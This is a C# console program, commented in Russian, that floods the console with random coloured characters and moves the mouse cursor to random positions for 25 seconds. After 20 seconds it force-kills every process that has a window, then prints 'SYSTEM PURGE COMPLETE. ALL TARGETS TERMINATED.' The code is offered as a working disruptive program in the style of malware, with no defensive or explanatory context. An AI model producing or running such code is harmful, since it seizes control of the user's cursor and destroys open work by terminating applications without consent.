using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

class TotalEraseChaos
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);
    [DllImport("kernel32.dll")]
    static extern bool WriteConsoleOutput(IntPtr hConsoleOutput, CharInfo[] lpBuffer, Coord dwBufferSize, Coord dwBufferCoord, ref SmallRect lpWriteRegion);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // Импорт для управления курсором
    [DllImport("user32.dll")]
    static extern bool SetCursorPos(int X, int Y);
    // Импорт для получения разрешения экрана
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);

    [StructLayout(LayoutKind.Explicit)]
    public struct CharUnion { [FieldOffset(0)] public char UnicodeChar; [FieldOffset(0)] public byte AsciiChar; }
    [StructLayout(LayoutKind.Sequential)]
    public struct CharInfo { public CharUnion Char; public ushort Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    public struct Coord { public short X; public short Y; }
    [StructLayout(LayoutKind.Sequential)]
    public struct SmallRect { public short Left, Top, Right, Bottom; }

    static void Main()
    {
        IntPtr hWnd = GetConsoleWindow();
        ShowWindow(hWnd, 3); // Развернуть окно

        IntPtr h = GetStdHandle(-11);
        short w = (short)Console.LargestWindowWidth;
        short h_eff = (short)Console.LargestWindowHeight;

        // Получаем размеры экрана для метания курсора
        int scrW = GetSystemMetrics(0);
        int scrH = GetSystemMetrics(1);

        CharInfo[] buffer = new CharInfo[w * h_eff];
        Random rnd = new Random();
        Stopwatch sw = Stopwatch.StartNew();
        int currentPid = Process.GetCurrentProcess().Id;

        for (int i = 0; i < buffer.Length; i++) { buffer[i].Attributes = 0; buffer[i].Char.AsciiChar = 32; }

        while (sw.Elapsed.TotalSeconds < 25)
        {
            double elapsed = sw.Elapsed.TotalSeconds;

            // 1. ХАОТИЧНЫЙ КУРСОР (Работает постоянно)
            SetCursorPos(rnd.Next(0, scrW), rnd.Next(0, scrH));

            // 2. ЗАКРЫТИЕ ОКОН (После 20-й секунды)
            if (elapsed >= 20.0)
            {
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        if (p.MainWindowHandle != IntPtr.Zero && p.Id != currentPid)
                        {
                            p.Kill();
                        }
                    }
                    catch { }
                }
            }

            // 3. ОТРИСОВКА ВИЗУАЛЬНЫХ ЭФФЕКТОВ
            double progress = elapsed / 25.0;
            int intensity = (int)(buffer.Length * 0.3 * progress) + 50;

            for (int k = 0; k < intensity; k++)
            {
                int i = rnd.Next(buffer.Length);
                if (rnd.Next(100) < 30)
                {
                    buffer[i].Attributes = 0;
                    buffer[i].Char.AsciiChar = 32;
                }
                else
                {
                    buffer[i].Attributes = (ushort)rnd.Next(0, 256);
                    buffer[i].Char.AsciiChar = (byte)rnd.Next(33, 126);
                }
            }

            SmallRect rect = new SmallRect { Left = 0, Top = 0, Right = w, Bottom = h_eff };
            WriteConsoleOutput(h, buffer, new Coord { X = w, Y = h_eff }, new Coord { X = 0, Y = 0 }, ref rect);

            Thread.Sleep(10);
        }

        Console.ResetColor();
        Console.Clear();
        Console.WriteLine("SYSTEM PURGE COMPLETE. ALL TARGETS TERMINATED.");
        Thread.Sleep(2000);
    }
}